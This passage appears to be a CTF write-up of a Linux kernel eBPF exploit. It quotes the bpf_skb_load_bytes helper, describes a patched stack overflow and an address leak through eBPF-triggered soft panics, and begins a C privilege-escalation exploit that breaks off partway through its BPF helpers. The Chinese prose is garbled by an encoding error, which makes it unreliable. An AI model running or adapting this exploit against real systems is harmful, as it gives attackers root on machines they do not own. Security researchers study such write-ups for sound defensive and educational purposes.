title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h2><p>è¿™é‡Œå‡ºç°äº†ä¸€ä¸ªæ–°çš„å‡½æ•°<code>bpf_skb_load_bytes</code>å¯ä»¥è¿›è¡Œç»•è¿‡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">BPF_CALL_4(bpf_skb_load_bytes, <span class="keyword">const</span> struct sk_buff *, skb, u32, offset,</span><br><span class="line">   <span class="keyword">void</span> *, to, u32, len)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">void</span> *ptr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(offset &gt; <span class="number">0xffff</span>))</span><br><span class="line"><span class="keyword">goto</span> err_clear;</span><br><span class="line"></span><br><span class="line">ptr = skb_header_pointer(skb, offset, len, to);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!ptr))</span><br><span class="line"><span class="keyword">goto</span> err_clear;</span><br><span class="line"><span class="keyword">if</span> (ptr != to)</span><br><span class="line"><span class="built_in">memcpy</span>(to, ptr, len);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err_clear:</span><br><span class="line"><span class="built_in">memset</span>(to, <span class="number">0</span>, len);</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯è¯»å–socketç¼“å†²åŒºåˆ°æŒ‡å®šçš„ä½ç½®ï¼Œåœ¨ebpfç¨‹åºä¸­å¯ä»¥æ˜¯æ ˆæˆ–è€…mapã€‚</p><p>ç„¶è€Œå› ä¸ºpatchçš„ç¼˜æ•…æˆ‘ä»¬å¯ä»¥å¾ˆè½»æ¾çš„å®ç°æ ˆæº¢å‡ºã€‚</p><h3 id="æ³„æ¼åœ°å€"><a href="#æ³„æ¼åœ°å€" class="headerlink" title="æ³„æ¼åœ°å€"></a>æ³„æ¼åœ°å€</h3><p>è¿™é‡Œleakçš„æ–¹æ³•å»¶ç”¨ä½œè€…çš„æ–¹æ³•ã€‚</p><p>åœ¨æ–°ç‰ˆæœ¬å†…æ ¸ä¸­ebpfç¨‹åºcrashå¹¶ä¸ä¼šé€ æˆå†…æ ¸çš„å´©æºƒï¼Œå½“<code>/proc/sys/kernel/panic_on_oops</code> å€¼ä¸º 0 æ—¶ <code>soft panic</code> å¹¶ä¸ä¼šç›´æ¥ panicã€‚ä¼¼ä¹åœ¨é»˜è®¤æƒ…å†µä¸‹å…¶å€¼å°±æ˜¯ 0ï¼Œå¦‚ Ubuntu20.04ã€‚è€Œåœ¨kernel pwné¢˜ç›®ä¸­æƒ³å‡ºç°ä¸Šè¿°æƒ…å†µçš„æ–¹æ³•æ˜¯åœ¨qemuå¯åŠ¨é¡¹ä¸­æ·»åŠ <code> oops = panic</code>ã€‚è€Œåœ¨å‘ç”Ÿ<code>soft panic</code>æ—¶ä¼šæ‰“å°å‡ºæ¥å†…æ ¸åœ°å€ã€‚æ‰€ä»¥è¿™é‡Œé€‰æ‹©è¿™æ ·ä½¿ç”¨ï¼Œä½¿ebpfç¨‹åºå‡ºç°crashç´§æ¥ç€å°±ä¼šæ‰“å°å‡ºåœ°å€å³å¯ã€‚</p><h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><p>è¿™é‡Œå› ä¸ºå¯ä»¥å¾ˆç®€å•çš„è¿›è¡Œæ ˆæº¢å‡ºæ‰€ä»¥å°±ä¸å¤šèµ˜è¿°äº†ã€‚æ‰€ä»¥ç›´æ¥ç»™å‡ºexp</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf_common.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _BPF_DEFS_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _BPF_DEFS_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                        \</span></span><br><span class="line"><span class="meta">        .code = CODE,                          \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                        \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                        \</span></span><br><span class="line"><span class="meta">        .off = OFF,                            \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64_RAW(DST, SRC, IMM)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                              \</span></span><br><span class="line"><span class="meta">        .code = BPF_LD | BPF_DW | BPF_IMM,           \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                              \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                              \</span></span><br><span class="line"><span class="meta">        .off = 0,                                    \</span></span><br><span class="line"><span class="meta">        .imm = (__u32)(IMM)&#125;),                       \</span></span><br><span class="line"><span class="meta">        ((struct bpf_insn)&#123;                          \</span></span><br><span class="line"><span class="meta">            .code = 0, <span class="comment">/* zero is reserved opcode */</span> \</span></span><br><span class="line"><span class="meta">            .dst_reg = 0,                            \</span></span><br><span class="line"><span class="meta">            .src_reg = 0,                            \</span></span><br><span class="line"><span class="meta">            .off = 0,                                \</span></span><br><span class="line"><span class="meta">            .imm = ((__u64)(IMM)) &gt;&gt; 32&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Memory load, dst_reg = *(uint *) (src_reg + off16) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                             \</span></span><br><span class="line"><span class="meta">        .code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                             \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                             \</span></span><br><span class="line"><span class="meta">        .off = OFF,                                 \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Memory store, *(uint *) (dst_reg + off16) = src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_STX_MEM(SIZE, DST, SRC, OFF)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                             \</span></span><br><span class="line"><span class="meta">        .code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                             \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                             \</span></span><br><span class="line"><span class="meta">        .off = OFF,                                 \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conditional jumps against immediates, if (dst_reg &#x27;op&#x27; imm32) goto pc + off16 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP_IMM(OP, DST, IMM, OFF)        \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                       \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                       \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                         \</span></span><br><span class="line"><span class="meta">        .off = OFF,                           \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like BPF_JMP_IMM, but with 32-bit wide operands for comparison. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP32_IMM(OP, DST, IMM, OFF)        \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP32 | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                           \</span></span><br><span class="line"><span class="meta">        .off = OFF,                             \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Short form of mov, dst_reg = imm32 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_IMM(DST, IMM)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                      \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_MOV | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                      \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                        \</span></span><br><span class="line"><span class="meta">        .off = 0,                            \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_IMM(DST, IMM)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                    \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU | BPF_MOV | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                    \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                      \</span></span><br><span class="line"><span class="meta">        .off = 0,                          \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Short form of mov, dst_reg = src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_REG(DST, SRC)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                      \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_MOV | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                      \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                      \</span></span><br><span class="line"><span class="meta">        .off = 0,                            \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_REG(DST, SRC)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                    \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU | BPF_MOV | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                    \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                    \</span></span><br><span class="line"><span class="meta">        .off = 0,                          \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_IMM(OP, DST, IMM)             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                           \</span></span><br><span class="line"><span class="meta">        .off = 0,                               \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_REG(OP, DST, SRC)             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_OP(OP) | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                         \</span></span><br><span class="line"><span class="meta">        .off = 0,                               \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Program exit */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_EXIT_INSN()             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;             \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP | BPF_EXIT, \</span></span><br><span class="line"><span class="meta">        .dst_reg = 0,               \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,               \</span></span><br><span class="line"><span class="meta">        .off = 0,                   \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* BPF_LD_IMM64 macro encodes single &#x27;load 64-bit immediate&#x27; insn */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64(DST, IMM) \</span></span><br><span class="line"><span class="meta">    BPF_LD_IMM64_RAW(DST, 0, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_MAP_FD(DST, MAP_FD) \</span></span><br><span class="line"><span class="meta">    BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// varies from userspace bpf_map_info definition so need to redefine</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info_kernel</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    __u32 type;</span><br><span class="line">    __u32 id;</span><br><span class="line">    __u32 key_size;</span><br><span class="line">    __u32 value_size;</span><br><span class="line">    __u32 max_entries;</span><br><span class="line">    __u32 map_flags;</span><br><span class="line">    <span class="keyword">char</span> name[BPF_OBJ_NAME_LEN];</span><br><span class="line">    __u32 ifindex;</span><br><span class="line">    __u32 btf_vmlinux_value_type_id;</span><br><span class="line">    __u64 netns_dev;</span><br><span class="line">    __u64 netns_ino;</span><br><span class="line">    __u32 btf_id;</span><br><span class="line">    __u32 btf_key_type_id;</span><br><span class="line">    __u32 btf_value_type_id;</span><br><span class="line">&#125; __attribute__((aligned(<span class="number">8</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf</span><span class="params">(<span class="keyword">int</span> cmd, <span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, cmd, attrs, <span class="keyword">sizeof</span>(*attrs));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_map</span><span class="params">(<span class="keyword">union</span> bpf_attr *map_attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_CREATE, map_attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">update_map_element</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint64_t</span> key, <span class="keyword">void</span> *value, <span class="keyword">uint64_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_fd = fd;</span><br><span class="line">    attr.key = (<span class="keyword">uint64_t</span>)&amp;key;</span><br><span class="line">    attr.value = (<span class="keyword">uint64_t</span>)value;</span><br><span class="line">    attr.flags = flags;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lookup_map_element</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint64_t</span> key, <span class="keyword">void</span> *value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_fd = fd;</span><br><span class="line">    attr.key = (<span class="keyword">uint64_t</span>)&amp;key;</span><br><span class="line">    attr.value = (<span class="keyword">uint64_t</span>)value;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">obj_get_info_by_fd</span><span class="params">(<span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span 